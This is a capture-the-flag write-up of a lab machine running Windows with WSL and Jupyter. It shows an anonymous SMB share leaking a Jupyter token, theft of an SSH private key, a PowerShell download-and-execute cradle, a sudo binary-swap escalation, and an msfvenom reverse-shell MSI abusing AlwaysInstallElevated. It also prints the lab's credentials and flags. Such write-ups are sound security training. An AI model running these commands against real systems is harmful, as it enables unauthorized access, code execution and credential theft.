
# PORT SCAN
---

| Port      | Service        |
|-----------|----------------|
| 22/tcp    | ssh            |
| 135/tcp   | msrpc          |
| 139/tcp   | netbios-ssn    |
| 445/tcp   | microsoft-ds   |
| 3389/tcp  | ms-wbt-server  |
| 5985/tcp  | http           |
| 8888/tcp  | http (Jupyter) |
| 47001/tcp | http           |
| 49664/tcp | msrpc          |
| 49665/tcp | msrpc          |
| 49666/tcp | msrpc          |
| 49668/tcp | msrpc          |
| 49669/tcp | msrpc          |
| 49670/tcp | msrpc          |
| 49674/tcp | msrpc          |



# RECONNAISSANCE
---

We need to add the domain to `/etc/hosts`:

```bash
echo '10.201.35.158 DEV-DATASCI-JUP' | sudo tee -a /etc/hosts
```

Let's check SMB:

```bash
smbclient -N -L //DEV-DATASCI-JUP


	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	datasci-team    Disk      
	IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
```

We can connect to the `datasci-team` share:

```bash
smbclient -N //DEV-DATASCI-JUP/datasci-team
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Aug 25 11:27:02 2022
  ..                                  D        0  Thu Aug 25 11:27:02 2022
  .ipynb_checkpoints                 DA        0  Thu Aug 25 11:26:47 2022
  Long-Tailed_Weasel_Range_-_CWHR_M157_[ds1940].csv      A      146  Thu Aug 25 11:26:46 2022
  misc                               DA        0  Thu Aug 25 11:26:47 2022
  MPE63-3_745-757.pdf                 A   414804  Thu Aug 25 11:26:46 2022
  papers                             DA        0  Thu Aug 25 11:26:47 2022
  pics                               DA        0  Thu Aug 25 11:26:47 2022
  requirements.txt                    A       12  Thu Aug 25 11:26:46 2022
  weasel.ipynb                        A     4308  Thu Aug 25 11:26:46 2022
  weasel.txt                          A       51  Thu Aug 25 11:26:46 2022
```

If we go to `misc`, we can find a `jupyter_token.txt` file, we can use this token to authenticate on port `8888`:

![Pasted image 20250812172302.png](../../IMAGES/Pasted%20image%2020250812172302.png)

We got the token:

```
067470c5ddsadc54153ghfjd817d15b5d5f5341e56b0dsad78a
```

![Pasted image 20250812172309.png](../../IMAGES/Pasted%20image%2020250812172309.png)

We can use it here:

![Pasted image 20250812172313.png](../../IMAGES/Pasted%20image%2020250812172313.png)

Let's proceed to exploitation.


# EXPLOITATION
---

Once we're inside the jupyter panel, we can notice this:

![Pasted image 20250812172316.png](../../IMAGES/Pasted%20image%2020250812172316.png)

It says there aren't terminals running, let's check if we can open one:

![Pasted image 20250812172323.png](../../IMAGES/Pasted%20image%2020250812172323.png)

We can open a terminal:

![Pasted image 20250812172328.png](../../IMAGES/Pasted%20image%2020250812172328.png)


We're the `dev-datasci` user, we can read the key of the user:

```
(base) dev-datasci@DEV-DATASCI-JUP:~$ cat dev-datasci-lowpriv_id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBUoe5ZSezzC65UZhWt4dbvxKor+dNggEhudzK+JSs+YwAAAKjQ358n0N+f
JwAAAAtzc2gtZWQyNTUxOQAAACBUoe5ZSezzC65UZhWt4dbvxKor+dNggEhudzK+JSs+Yw
AAAED9OhQumFOiC3a05K+X6h22gQga0sQzmISvJJ2YYfKZWVSh7llJ7PMLrlRmFa3h1u/E
qiv502CASG53Mr4lKz5jAAAAI2Rldi1kYXRhc2NpLWxvd3ByaXZAREVWLURBVEFTQ0ktSl
VQAQI=
-----END OPENSSH PRIVATE KEY-----
```

Let's check if the key works:

```
nano dev-datasci-lowpriv_id_ed25519
chmod 600 dev-datasci-lowpriv_id_ed25519
ssh -i dev-datasci-lowpriv_id_ed25519 dev-datasci-lowpriv@DEV-DATASCI-JUP
```

![Pasted image 20250812172341.png](../../IMAGES/Pasted%20image%2020250812172341.png)1


We can begin privilege escalation.


# PRIVILEGE ESCALATION
---

Let's upload some privesc scripts such as `winpeas`:

```powershell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://IP:8000/winPEAS.ps1')"
```

![Pasted image 20250812172346.png](../../IMAGES/Pasted%20image%2020250812172346.png)

First of all, we can find cleartext credentials for our `dev-datasci-lowpriv` user:

```
dev-datasci-lowpriv / wUqnKWqzha*W!PWrPRWi!M8faUn
```

Aside from that, nothing that interesting can be found on the scan, we can run another tool, before we do that, I'll divide the privesc on two ways:


## First way (No Admin Shell)
---

if we go back to our terminal (The one from jupyter), we can use linpeas to find this:

![Pasted image 20250812172355.png](../../IMAGES/Pasted%20image%2020250812172355.png)

![Pasted image 20250812172358.png](../../IMAGES/Pasted%20image%2020250812172358.png)

We got the following sudo -l permissions:

```
base) dev-datasci@DEV-DATASCI-JUP:~$ sudo -l
Matching Defaults entries for dev-datasci on DEV-DATASCI-JUP:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dev-datasci may run the following commands on DEV-DATASCI-JUP:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /home/dev-datasci/.local/bin/jupyter, /bin/su dev-datasci -c *
```

We can copy anything due to the `*` on cp, let's copy `/usr/bin/bash` to the `.local/bin` directory so once we run sudo again, we can get a root shell:

```
cp /usr/bin/bash /home/dev-datasci/.local/bin
mv .local/bin/bash /home/dev-datasci/.local/bin/jupyter
```

Once we've moved the file, we can run sudo:

```
sudo /home/dev-datasci/.local/bin/jupyter
```

![Pasted image 20250812172432.png](../../IMAGES/Pasted%20image%2020250812172432.png)

We're root inside of the Linux terminal, we can mount the entire `C:\` disk and retrieve root flag there:

```
cd /mnt
mount -t drvfs 'c:' /mnt/c
```

![Pasted image 20250812172437.png](../../IMAGES/Pasted%20image%2020250812172437.png)

We can see the `C` disk on there, we can get the root flag now:

```
root@DEV-DATASCI-JUP:/mnt/c# cat /mnt/c/Users/Administrator/Desktop/root.txt
THM{evelated_w3as3l_l0ngest_boi}
```

## Second way (With Admin Shell)

In order to check the other privesc way, we need to use the [PrivescCheck.ps1](https://github.com/itm4n/PrivescCheck/blob/master/PrivescCheck.ps1) script:

```
powershell -Command "Invoke-WebRequest -Uri http://IP:8000/PrivescCheck.ps1 -OutFile PrivescCheck.ps1"
```

Now, we need to use the script and save the output on a file to analyze it:

```powershell
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME%"
```

We can notice this:

![Pasted image 20250812172516.png](../../IMAGES/Pasted%20image%2020250812172516.png)

This machine appears to be vulnerable to `AlwaysInstallElevated` privesc, we can find this article:

https://blog.cyberplural.com/leveraging-alwaysinstallelevated-for-windows-privilege-escalation/

![Pasted image 20250812172520.png](../../IMAGES/Pasted%20image%2020250812172520.png)

![Pasted image 20250812172528.png](../../IMAGES/Pasted%20image%2020250812172528.png)


Let's recreate the PoC, to begin with, we need to create a `.msi` file using `msfvenom`:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.14.21.28 LPORT=9001 -f msi -o shell.msi
```
Next, we need to download it:

```
powershell -Command "Invoke-WebRequest -Uri http://10.14.21.28:8000/shell.msi -OutFile shell.msi"
```

Once we have the file, we need to set a listener and execute it like this:

```
runas /u:dev-datasci-lowpriv "msiexec /qn /i C:\Users\dev-datasci-lowpriv\Documents\shell.msi"

# Once asked for password enter:

wUqnKWqzha*W!PWrPRWi!M8faUn
```

![Pasted image 20250812172535.png](../../IMAGES/Pasted%20image%2020250812172535.png)

If we check our listener, we got a shell as `nt authority\system`:

![Pasted image 20250812172538.png](../../IMAGES/Pasted%20image%2020250812172538.png)


Let's read both flags and end the CTF:

```
C:\Windows\system32>type C:\Users\dev-datasci-lowpriv\Desktop\user.txt
THM{w3as3ls_@nd_pyth0ns} 

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
THM{evelated_w3as3l_l0ngest_boi}
```

We can end the CTF now.

![Pasted image 20250812172543.png](../../IMAGES/Pasted%20image%2020250812172543.png)

![Pasted image 20250812172547.png](../../IMAGES/Pasted%20image%2020250812172547.png)

